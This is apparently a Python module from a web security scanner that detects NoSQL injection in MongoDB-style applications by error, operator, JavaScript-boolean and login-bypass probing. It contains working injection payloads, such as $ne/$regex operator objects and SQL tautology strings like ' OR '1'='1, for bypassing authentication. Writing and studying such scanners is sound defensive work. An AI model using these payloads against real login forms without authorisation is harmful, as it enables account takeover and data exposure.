"""
NoSQL injection (NoSQLi) detector — MongoDB-style operator and JS injection.

Techniques (detection only; confirmed hits go to a dedicated exploit tool):

* **Error-based** — a NoSQL driver error (MongoDB, Mongoose, CouchDB) after an
  injected quote/brace.
* **Operator injection (boolean)** — the module turns ``id=1`` into ``id[$ne]=1``
  (should match *everything*, i.e. differ from baseline) and ``id[$eq]=1``
  (should equal baseline). A clear TRUE≈baseline / FALSE≠baseline split with the
  operator form is strong evidence.
* **JS string boolean** — for ``$where``/JS contexts, append ``' || '1'=='1``
  (true) vs ``' && '1'=='2`` (false).
* **Auth bypass** — ``username[$ne]=`` / JSON ``{"$ne": null}`` style login
  bypass, re-verified with a control payload.

Comparison heuristics are shared with the SQLi detector for consistency.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Awaitable, Callable

from falsealarm.core.sqli.detector import _clean, _ratio

Sender = Callable[[str], Awaitable[dict]]

NOSQL_ERRORS = re.compile(
    r"MongoError|MongoServerError|mongodb\.|Mongoose|MongoParseError|BSONError|BSONTypeError|"
    r"\$where.*?SyntaxError|unterminated string literal|E11000|command .*? requires authentication|"
    r"couchdb|CouchError|unexpected token.*?JSON|CastError: Cast to|"
    r"\$(ne|gt|lt|in|nin|regex|where|eq|or|and) is not allowed|unknown operator",
    re.I,
)

# Appended to a value: unbalanced quotes/braces for error-based, plus JS booleans.
ERROR_PROBES = ["'", '"', "\\", "';return true;var x='", "'}}]}", "'||'1'=='1"]
JS_BOOLEAN = ("' || '1'=='1", "' && '1'=='2")

SIMILAR = 0.98
DIFFERENT = 0.95


@dataclass
class NoSQLiResult:
    parameter: str = ""
    technique: str = "operator"   # error | operator | js-boolean | auth-bypass
    payload: str = ""
    evidence: str = ""
    where: str = "query"
    severity: str = "critical"
    extra: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        d = {
            "type": "nosqli", "parameter": self.parameter, "technique": self.technique,
            "dbms": "MongoDB/NoSQL", "payload": self.payload, "evidence": self.evidence,
            "where": self.where, "severity": self.severity,
        }
        d.update(self.extra)
        return d


def match_nosql_error(body: str) -> bool:
    return bool(body) and bool(NOSQL_ERRORS.search(body))


class NoSQLiDetector:
    def __init__(self, baseline: dict):
        self.baseline_status = baseline.get("status", 0)
        self.baseline_body = _clean(baseline.get("body", "") or "")
        self.baseline_error = match_nosql_error(baseline.get("body", "") or "")

    async def error_based(self, send: Sender) -> NoSQLiResult | None:
        for probe in ERROR_PROBES:
            resp = await send(probe)
            if resp.get("error"):
                continue
            if match_nosql_error(resp.get("body", "")) and not self.baseline_error:
                return NoSQLiResult(technique="error", payload=probe,
                                    evidence=f"NoSQL driver error triggered by `{probe}`")
        return None

    async def js_boolean(self, send: Sender) -> NoSQLiResult | None:
        true_p, false_p = JS_BOOLEAN
        r_true, r_false = await send(true_p), await send(false_p)
        if r_true.get("error") or r_false.get("error"):
            return None
        bt, bf = _clean(r_true.get("body", "")), _clean(r_false.get("body", ""))
        sim_true, sim_false = _ratio(self.baseline_body, bt), _ratio(self.baseline_body, bf)
        if sim_true >= SIMILAR and sim_false < DIFFERENT and _ratio(bt, bf) < DIFFERENT:
            return NoSQLiResult(technique="js-boolean", payload=true_p,
                                evidence=f"$where JS boolean TRUE {sim_true:.2f} vs FALSE {sim_false:.2f}")
        return None

    async def operator_injection(self, send_ne: Sender, send_eq: Sender | None) -> NoSQLiResult | None:
        """send_ne issues the ``param[$ne]=orig`` request; send_eq the ``[$eq]``.

        ``$ne`` to the original value should match *other* rows (differ from
        baseline); ``$eq`` to the original should reproduce baseline.
        """
        r_ne = await send_ne("")
        r_eq = await send_eq("") if send_eq is not None else None
        if r_ne.get("error"):
            return None
        bne = _clean(r_ne.get("body", ""))
        if match_nosql_error(r_ne.get("body", "")) and not self.baseline_error:
            return NoSQLiResult(technique="error", payload="[$ne]",
                                evidence="NoSQL error from operator injection ([$ne])")
        beq = _clean(r_eq.get("body", "")) if r_eq else self.baseline_body
        sim_eq = _ratio(self.baseline_body, beq)
        diff_ne = _ratio(self.baseline_body, bne)
        # $eq≈baseline (query still works) and $ne clearly differs (operator honoured).
        if sim_eq >= SIMILAR and diff_ne < DIFFERENT and r_ne.get("status") == self.baseline_status:
            return NoSQLiResult(technique="operator", payload="param[$ne]=…",
                                evidence=f"$ne differs from baseline ({diff_ne:.2f}), $eq matches ({sim_eq:.2f})")
        return None


# --------------------------------------------------------------------------- #
# Auth bypass (operator injection on a login form)
# --------------------------------------------------------------------------- #

@dataclass
class NoSQLLoginProbe:
    # submit_operator(field->operator-payload dict) returns a response.
    submit: Callable[[dict], Awaitable[dict]]
    user_field: str
    pass_field: str
    failed_markers: tuple[str, ...] = (
        "invalid", "incorrect", "failed", "wrong", "denied", "try again", "unauthor",
    )

    async def baseline_fail(self) -> dict:
        return await self.submit({self.user_field: "falsealarm_x", self.pass_field: "falsealarm_y"})


# Operator payloads: field-name suffix (for form[name][$ne]) -> value.
AUTH_OPERATORS = [
    {"suffix": "[$ne]", "value": ""},
    {"suffix": "[$ne]", "value": "x"},
    {"suffix": "[$gt]", "value": ""},
    {"suffix": "[$regex]", "value": ".*"},
]

# JSON operator objects injected into credential fields of a JSON login body.
JSON_AUTH_OPERATORS = [
    {"$ne": None},
    {"$ne": "falsealarm_nope"},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$gte": ""},
]


async def detect_json_login_bypass(submit, user_path, pass_path, failed_markers=None) -> NoSQLiResult | None:
    """Auth-bypass on a JSON login body.

    ``submit(user_value, pass_value)`` builds the JSON body with the credential
    fields set to the given values (which may be operator objects like
    ``{"$ne": None}`` or SQL tautology strings) and returns the response.
    Tries NoSQL operator objects and SQL tautology strings, re-verified.
    """
    markers = failed_markers or ("invalid", "incorrect", "failed", "wrong", "denied",
                                 "try again", "unauthor", "sai", "không đúng",
                                 '"success":false', '"success": false', '"authenticated":false',
                                 '"error"', "not found")
    fail = await submit("falsealarm_nouser", "falsealarm_nopass")
    fail_body = (fail.get("body") or "").lower()
    fail_status = fail.get("status", 0)
    fail_len = len(fail_body)
    has_marker = any(m in fail_body for m in markers)
    # If bogus credentials already look authenticated (a token, success flag, or
    # a redirect with no failure marker), the endpoint doesn't distinguish logins,
    # so a "bypass" can't be told apart from normal behaviour — don't guess.
    fail_authed = any(k in fail_body for k in ("token", "jwt", "\"success\":true", "dashboard", "bearer"))
    if not has_marker and (fail_status in (301, 302, 303) or fail_authed or fail_status == 200):
        return None

    # (label, user_value, pass_value, technique)
    attempts: list[tuple] = []
    for op in JSON_AUTH_OPERATORS:
        attempts.append((f"{op}", op, op, "auth-bypass"))
    for taut in ("' OR '1'='1", "' OR 1=1-- -", '" OR "1"="1'):
        attempts.append((taut, taut, taut, "auth-bypass"))

    for label, uval, pval, technique in attempts:
        resp = await submit(uval, pval)
        if resp.get("error"):
            continue
        body = (resp.get("body") or "").lower()
        status = resp.get("status", 0)
        redirected = status in (301, 302, 303) and fail_status not in (301, 302, 303)
        marker_gone = has_marker and not any(m in body for m in markers)
        authed_token = any(k in body for k in ("token", "jwt", "\"success\":true", "dashboard", "welcome", "bearer"))
        grew = fail_len and abs(len(body) - fail_len) / max(fail_len, 1) > 0.30
        ok = redirected or marker_gone or (status == 200 and fail_status in (200, 401, 403) and (authed_token or grew))
        if not ok:
            continue
        control = await submit("falsealarm_zz", "falsealarm_zz")
        cbody = (control.get("body") or "").lower()
        control_ok = control.get("status") in (301, 302, 303) or (has_marker and not any(m in cbody for m in markers))
        if control_ok:
            continue
        is_nosql = isinstance(uval, dict)
        reason = "redirect" if redirected else "login-failure message removed" if marker_gone else "auth token/shape change"
        result = NoSQLiResult(
            parameter=".".join(str(p) for p in (user_path or ())),
            technique="auth-bypass", where="body",
            payload=f"{field_label(user_path)}={label}",
            evidence=f"JSON login bypass via {'NoSQL operator' if is_nosql else 'SQL tautology'} ({reason})",
        )
        if not is_nosql:
            # Report a SQL tautology hit as a SQL injection, not NoSQL.
            result.extra["type"] = "sqli"
            result.extra["dbms"] = "SQL"
        return result
    return None


def field_label(path) -> str:
    return ".".join(str(p) for p in path) if path else "credential"


async def detect_nosql_auth_bypass(probe: NoSQLLoginProbe) -> NoSQLiResult | None:
    fail = await probe.baseline_fail()
    fail_body = (fail.get("body") or "").lower()
    fail_status = fail.get("status", 0)
    fail_len = len(fail_body)
    has_marker = any(m in fail_body for m in probe.failed_markers)

    for op in AUTH_OPERATORS:
        fields = {
            probe.user_field + op["suffix"]: op["value"],
            probe.pass_field + op["suffix"]: op["value"],
        }
        resp = await probe.submit(fields)
        if resp.get("error"):
            continue
        body = (resp.get("body") or "").lower()
        status = resp.get("status", 0)
        redirected = status in (301, 302, 303) and fail_status not in (301, 302, 303)
        marker_gone = has_marker and not any(m in body for m in probe.failed_markers)
        grew = fail_len and abs(len(body) - fail_len) / max(fail_len, 1) > 0.30
        if redirected or marker_gone or (grew and status == 200 and fail_status in (200, 401, 403)):
            # Re-verify: an operator that must NOT match ([$eq] to a bogus value).
            control = await probe.submit({
                probe.user_field + "[$eq]": "falsealarm_nouser",
                probe.pass_field + "[$eq]": "falsealarm_nopass",
            })
            cbody = (control.get("body") or "").lower()
            control_bypassed = control.get("status") in (301, 302, 303) or (
                has_marker and not any(m in cbody for m in probe.failed_markers)
            )
            if not control_bypassed:
                reason = "redirect" if redirected else "login-failure message removed" if marker_gone else "response changed"
                return NoSQLiResult(parameter=probe.user_field, technique="auth-bypass",
                                    payload=f"{probe.user_field}{op['suffix']}={op['value']!r}",
                                    evidence=f"authentication bypassed via operator injection ({reason})",
                                    where="login")
    return None
